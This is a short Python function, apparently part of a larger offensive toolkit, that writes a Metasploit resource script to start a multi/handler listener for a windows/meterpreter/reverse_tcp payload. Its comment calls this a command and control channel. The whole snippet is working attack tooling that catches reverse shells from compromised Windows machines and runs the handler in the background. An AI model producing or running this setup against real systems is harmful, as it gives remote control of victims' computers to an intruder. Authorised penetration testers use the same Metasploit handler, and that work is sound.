#define function "setuphandler"
#describe: make a command and control channel using python, Meterpreter of Metasploit

def setuphandler(configfile,lhost,lport):
	configfile.write('use exploit/multi/handler\n')
	configfile.write('set PAYLOAD '+'windows/meterpreter/reverse_tcp\n')
	configfile.write('set LPORT '+str(lport)+'\n')
	configfile.write('set LHOST '+str(lhost)+'\n')
	configfile.write('exploit -j -z\n')
	configfile.write('setg DisablePayloadHandler 1\n')
